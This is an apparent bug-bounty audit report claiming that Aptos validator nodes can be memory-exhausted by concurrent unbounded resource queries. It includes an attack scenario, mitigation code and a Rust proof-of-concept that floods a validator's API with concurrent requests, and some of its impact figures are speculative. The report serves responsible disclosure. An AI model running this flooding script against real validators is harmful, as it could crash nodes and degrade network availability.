# Audit Report

## Title
Validator Node Memory Exhaustion via Unbounded Concurrent Resource Queries

## Summary
The move-resource-viewer's per-resource 100MB limit, combined with unlimited concurrent API requests and lack of aggregate memory controls, allows an attacker to exhaust validator node memory by sending multiple concurrent requests for accounts with many large resources, causing validator crashes and network availability loss.

## Finding Description

The vulnerability exists in the interaction between the REST API's resource viewing endpoint and the move-resource-viewer's memory limiting mechanism. [1](#0-0) 

Each resource annotation operation gets its own 100MB budget via `Limiter::default()`: [2](#0-1) 

The API allows retrieving up to 9999 resources per request: [3](#0-2) 

Validators expose the API by default at 0.0.0.0:8080: [4](#0-3) 

The API handles requests via a thread pool using `tokio::spawn_blocking`: [5](#0-4) 

With thread pool size of `num_cpus × runtime_worker_multiplier` (default 2): [6](#0-5) 

**Attack Scenario:**
1. Attacker creates or identifies accounts with many resources approaching the 1MB storage limit
2. Attacker sends N concurrent HTTP GET requests to `/accounts/{address}/resources?limit=9999` where N equals the thread pool size (e.g., 32 for 16 CPUs)
3. Each request processes up to 9999 resources via `get_resources_by_pagination`: [7](#0-6) 

4. For JSON responses, each resource is converted via `try_into_resources`: [8](#0-7) 

5. Each resource annotation allocates memory proportional to its complexity (up to 100MB budget per resource)
6. Aggregate memory: 32 concurrent requests × 9999 resources × avg 5-10MB per large resource = 1.6-3.2TB theoretical maximum
7. When aggregate memory exceeds available RAM, OS OOM-kills the validator process

## Impact Explanation

This vulnerability qualifies as **High Severity** under Aptos bug bounty criteria: "Validator node slowdowns, API crashes."

The impact includes:
- **Validator node crashes**: Memory exhaustion causes OS to OOM-kill the validator process
- **Loss of network availability**: Crashed validators cannot participate in consensus
- **Denial of service**: Repeated attacks prevent validator recovery
- **Network destabilization**: If multiple validators are targeted simultaneously, consensus liveness may be affected

While resources are limited to 1MB in storage, their annotated representation (with field names, type information) can be 5-10x larger. With no per-request aggregate limit and no rate limiting, concurrent requests compound memory usage multiplicatively.

## Likelihood Explanation

**Likelihood: Medium-to-High**

Exploitation requires:
- ✓ HTTP access to validator API (enabled by default at 0.0.0.0:8080)
- ✓ Ability to send concurrent requests (trivial with standard HTTP tools)
- ✓ Account with many large resources (attacker can create via transactions up to storage limits)

No special privileges or insider access required. Attack is network-accessible and repeatable.

## Recommendation

Implement multiple layers of protection:

1. **Add per-request aggregate memory limit**:
   - Track cumulative limiter usage across all resources in a request
   - Abort request if aggregate exceeds threshold (e.g., 500MB)

2. **Implement API rate limiting**:
   - Use semaphore to limit concurrent resource viewing operations
   - Add per-IP rate limiting at API layer

3. **Reduce maximum page size**:
   - Lower `DEFAULT_MAX_ACCOUNT_RESOURCES_PAGE_SIZE` from 9999 to 1000

4. **Add request-level memory accounting**:
```rust
pub struct ResourceQueryLimiter {
    per_resource_limit: usize,
    aggregate_limit: usize,
    used: AtomicUsize,
}

impl ResourceQueryLimiter {
    pub fn charge_resource(&self, cost: usize) -> Result<()> {
        let current = self.used.fetch_add(cost, Ordering::SeqCst);
        if current + cost > self.aggregate_limit {
            return Err(anyhow!("Request aggregate memory limit exceeded"));
        }
        Ok(())
    }
}
```

5. **Add concurrency control**:
```rust
// In Context struct
pub struct Context {
    // ... existing fields ...
    resource_query_semaphore: Arc<Semaphore>,
}

// Limit concurrent resource viewing operations
const MAX_CONCURRENT_RESOURCE_QUERIES: usize = 10;
```

## Proof of Concept

```rust
// PoC: Memory exhaustion via concurrent resource queries
// Run against a validator node with API enabled

use reqwest::Client;
use tokio;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let validator_api = "http://validator-ip:8080";
    let target_account = "0x1"; // Or any account with many resources
    
    let client = Client::new();
    let mut handles = vec![];
    
    // Send 32 concurrent requests (matching typical thread pool size)
    for i in 0..32 {
        let client = client.clone();
        let url = format!(
            "{}/accounts/{}/resources?limit=9999",
            validator_api, target_account
        );
        
        let handle = tokio::spawn(async move {
            println!("Request {} started", i);
            let response = client.get(&url).send().await;
            println!("Request {} completed: {:?}", i, response.is_ok());
        });
        
        handles.push(handle);
    }
    
    // Wait for all requests
    for handle in handles {
        handle.await?;
    }
    
    // Monitor validator: it should show high memory usage and
    // potentially crash if resources are large enough
    
    Ok(())
}
```

**To demonstrate:**
1. Deploy test validator with API enabled
2. Create test account with ~5000 resources of varying sizes via transactions
3. Run PoC with increasing concurrency
4. Monitor memory usage with `top` or `ps aux`
5. Observe memory exhaustion and potential OOM

## Notes

The vulnerability stems from an architectural mismatch: the limiter protects against individual resource processing complexity, but doesn't account for aggregate memory across concurrent requests. This is particularly dangerous because validators expose the API publicly by default, making them vulnerable to remote exploitation without authentication.

### Citations

**File:** third_party/move/tools/move-resource-viewer/src/limit.rs (L7-8)
```rust
// Default limit set to 100mb per query.
const DEFAULT_LIMIT: usize = 100_000_000;
```

**File:** third_party/move/tools/move-resource-viewer/src/lib.rs (L336-342)
```rust
    pub fn view_resource(
        &self,
        tag: &StructTag,
        blob: &[u8],
    ) -> anyhow::Result<AnnotatedMoveStruct> {
        self.view_resource_with_limit(tag, blob, &mut Limiter::default())
    }
```

**File:** config/src/config/api_config.rs (L76-76)
```rust
    pub runtime_worker_multiplier: usize,
```

**File:** config/src/config/api_config.rs (L100-100)
```rust
const DEFAULT_MAX_ACCOUNT_RESOURCES_PAGE_SIZE: u16 = 9999;
```

**File:** terraform/helm/aptos-node/files/configs/validator-base.yaml (L40-42)
```yaml
api:
  enabled: true
  address: "0.0.0.0:8080"
```

**File:** api/src/context.rs (L470-558)
```rust
    pub fn get_resources_by_pagination(
        &self,
        address: AccountAddress,
        prev_state_key: Option<&StateKey>,
        version: u64,
        limit: u64,
    ) -> Result<(Vec<(StructTag, Vec<u8>)>, Option<StateKey>)> {
        let account_iter = if !db_sharding_enabled(&self.node_config) {
            Box::new(
                self.db
                    .get_prefixed_state_value_iterator(
                        &StateKeyPrefix::from(address),
                        prev_state_key,
                        version,
                    )?
                    .map(|item| item.map_err(|err| anyhow!(err.to_string()))),
            )
        } else {
            self.indexer_reader
                .as_ref()
                .ok_or_else(|| format_err!("Indexer reader doesn't exist"))?
                .get_prefixed_state_value_iterator(
                    &StateKeyPrefix::from(address),
                    prev_state_key,
                    version,
                )?
        };
        // TODO: Consider rewriting this to consider resource groups:
        // * If a resource group is found, expand
        // * Return Option<Result<(PathType, StructTag, Vec<u8>)>>
        // * Count resources and only include a resource group if it can completely fit
        // * Get next_key as the first struct_tag not included
        let mut resource_iter = account_iter
            .filter_map(|res| match res {
                Ok((k, v)) => match k.inner() {
                    StateKeyInner::AccessPath(AccessPath { address: _, path }) => {
                        match Path::try_from(path.as_slice()) {
                            Ok(Path::Resource(struct_tag)) => {
                                Some(Ok((struct_tag, v.bytes().to_vec())))
                            }
                            // TODO: Consider expanding to Path::Resource
                            Ok(Path::ResourceGroup(struct_tag)) => {
                                Some(Ok((struct_tag, v.bytes().to_vec())))
                            }
                            Ok(Path::Code(_)) => None,
                            Err(e) => Some(Err(anyhow::Error::from(e))),
                        }
                    }
                    _ => {
                        error!("storage prefix scan return inconsistent key ({:?}) with expected key prefix ({:?}).", k, StateKeyPrefix::from(address));
                        Some(Err(format_err!( "storage prefix scan return inconsistent key ({:?})", k )))
                    }
                },
                Err(e) => Some(Err(e)),
            })
            .take(limit as usize + 1);
        let kvs = resource_iter
            .by_ref()
            .take(limit as usize)
            .collect::<Result<Vec<(StructTag, Vec<u8>)>>>()?;

        // We should be able to do an unwrap here, otherwise the above db read would fail.
        let state_view = self.state_view_at_version(version)?;
        let converter = state_view.as_converter(self.db.clone(), self.indexer_reader.clone());

        // Extract resources from resource groups and flatten into all resources
        let kvs = kvs
            .into_iter()
            .map(|(tag, value)| {
                if converter.is_resource_group(&tag) {
                    // An error here means a storage invariant has been violated
                    bcs::from_bytes::<ResourceGroup>(&value)
                        .map(|map| map.into_iter().collect::<Vec<_>>())
                        .map_err(|e| e.into())
                } else {
                    Ok(vec![(tag, value)])
                }
            })
            .collect::<Result<Vec<Vec<(StructTag, Vec<u8>)>>>>()?
            .into_iter()
            .flatten()
            .collect();

        let next_key = if let Some((struct_tag, _v)) = resource_iter.next().transpose()? {
            Some(StateKey::resource(&address, &struct_tag)?)
        } else {
            None
        };
        Ok((kvs, next_key))
```

**File:** api/src/context.rs (L1645-1653)
```rust
pub async fn api_spawn_blocking<F, T, E>(func: F) -> Result<T, E>
where
    F: FnOnce() -> Result<T, E> + Send + 'static,
    T: Send + 'static,
    E: InternalError + Send + 'static,
{
    tokio::task::spawn_blocking(func)
        .await
        .map_err(|err| E::internal_with_code_no_info(err, AptosErrorCode::InternalError))?
```

**File:** api/types/src/convert.rs (L85-91)
```rust
    pub fn try_into_resources<'b>(
        &self,
        data: impl Iterator<Item = (StructTag, &'b [u8])>,
    ) -> Result<Vec<MoveResource>> {
        data.map(|(typ, bytes)| self.inner.view_resource(&typ, bytes)?.try_into())
            .collect()
    }
```
